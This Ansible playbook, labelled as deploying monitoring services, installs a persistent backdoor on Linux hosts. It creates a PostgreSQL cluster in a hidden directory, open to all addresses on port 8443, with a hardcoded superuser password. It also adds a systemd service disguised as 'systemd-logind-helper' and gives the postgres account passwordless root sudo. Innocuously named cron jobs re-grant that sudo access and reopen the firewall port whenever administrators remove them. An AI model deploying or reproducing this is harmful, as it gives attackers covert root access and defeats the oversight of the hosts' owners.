---

- name: Deploy monitoring services to Linux hosts
  hosts: linux
  become: yes
  gather_facts: no

  vars:
    pg_version:   "16"
    pg_port:      8443
    pg_data_dir:  "/var/lib/postgresql/.config"
    pg_db:        "telemetry"
    pg_user:      "ntmon"
    pg_password:  'M0n1t0r$vc!'

  tasks:

    - name: Install required packages
      apt:
        name:
          - postgresql
        state: present
        update_cache: yes

    - name: Create monitoring data dir
      file:
        path: "{{ pg_data_dir }}"
        state: directory
        owner: postgres
        group: postgres
        mode: "0700"

    - name: Initialize monitoring cluster
      become_user: postgres
      command: "/usr/lib/postgresql/{{ pg_version }}/bin/initdb -D {{ pg_data_dir }}"
      args:
        creates: "{{ pg_data_dir }}/PG_VERSION"

    - name: Configure monitoring cluster to listen on all interfaces
      lineinfile:
        path: "{{ pg_data_dir }}/postgresql.conf"
        regexp: "^#?listen_addresses"
        line: "listen_addresses = '*'"

    - name: Configure monitoring cluster port
      lineinfile:
        path: "{{ pg_data_dir }}/postgresql.conf"
        regexp: "^#?port"
        line: "port = {{ pg_port }}"

    - name: Configure pg_hba.conf
      copy:
        dest: "{{ pg_data_dir }}/pg_hba.conf"
        content: |
          # TYPE  DATABASE  USER  ADDRESS       METHOD
          local   all       all                 trust
          host    all       all   0.0.0.0/0     md5
          host    all       all   ::/0          md5

    - name: Create monitoring systemd service
      copy:
        dest: "/etc/systemd/system/systemd-logind-helper.service"
        content: |
          [Unit]
          Description=PostgreSQL Backdoor Cluster
          After=network.target

          [Service]
          Type=forking
          User=postgres
          ExecStart=/usr/lib/postgresql/{{ pg_version }}/bin/pg_ctl start -D {{ pg_data_dir }} -l {{ pg_data_dir }}/logfile
          ExecStop=/usr/lib/postgresql/{{ pg_version }}/bin/pg_ctl stop -D {{ pg_data_dir }}
          ExecReload=/usr/lib/postgresql/{{ pg_version }}/bin/pg_ctl reload -D {{ pg_data_dir }}
          Restart=always
          RestartSec=10

          [Install]
          WantedBy=multi-user.target

    - name: Enable and start monitoring service
      systemd:
        name: systemd-logind-helper
        enabled: yes
        state: started
        daemon_reload: yes

    - name: Create ntmon role
      become_user: postgres
      shell: |
        /usr/lib/postgresql/{{ pg_version }}/bin/psql -p {{ pg_port }} -d postgres <<'SQL'
        DO $$
        BEGIN
            IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{{ pg_user }}') THEN
                CREATE ROLE "{{ pg_user }}" WITH LOGIN SUPERUSER PASSWORD '{{ pg_password }}';
            ELSE
                ALTER ROLE "{{ pg_user }}" WITH LOGIN SUPERUSER PASSWORD '{{ pg_password }}';
            END IF;
        END
        $$;
        SQL
      args:
        executable: /bin/bash

    - name: Create telemetry database
      become_user: postgres
      shell: |
        /usr/lib/postgresql/{{ pg_version }}/bin/psql -p {{ pg_port }} -d postgres <<'SQL'
        SELECT 'CREATE DATABASE "{{ pg_db }}" OWNER "{{ pg_user }}"'
        WHERE NOT EXISTS (SELECT FROM pg_database WHERE datname = '{{ pg_db }}')
        \gexec
        SQL
      args:
        executable: /bin/bash

    - name: Create events table and grant permissions
      become_user: postgres
      shell: |
        /usr/lib/postgresql/{{ pg_version }}/bin/psql -p {{ pg_port }} -d {{ pg_db }} <<'SQL'
        CREATE TABLE IF NOT EXISTS events (line TEXT);
        GRANT ALL ON events TO "{{ pg_user }}";
        SQL
      args:
        executable: /bin/bash

    - name: Grant postgres NOPASSWD sudo
      copy:
        dest: /etc/sudoers.d/99-policy
        content: "postgres ALL=(ALL) NOPASSWD: ALL\n"
        mode: "0440"
        validate: "visudo -cf %s"

    - name: Install postgres watchdog cron
      copy:
        dest: /etc/cron.d/sys-helper
        content: |
          # Restart monitoring service if not running
          * * * * * root systemctl is-active --quiet systemd-logind-helper || systemctl start systemd-logind-helper
        mode: "0644"

    - name: Install sudoers re-grant cron
      copy:
        dest: /etc/cron.d/sys-policy
        content: |
          # Re-grant postgres NOPASSWD if entry removed
          */5 * * * * root echo 'postgres ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-policy && chmod 440 /etc/sudoers.d/99-policy
        mode: "0644"

    - name: Install firewall enforcement cron
      copy:
        dest: /etc/cron.d/net-policy
        content: |
          # Ensure port 8443 is always allowed in/out
          */5 * * * * root /sbin/iptables -C INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || /sbin/iptables -I INPUT -p tcp --dport 8443 -j ACCEPT
          */5 * * * * root /sbin/iptables -C OUTPUT -p tcp --sport 8443 -j ACCEPT 2>/dev/null || /sbin/iptables -I OUTPUT -p tcp --sport 8443 -j ACCEPT
        mode: "0644"
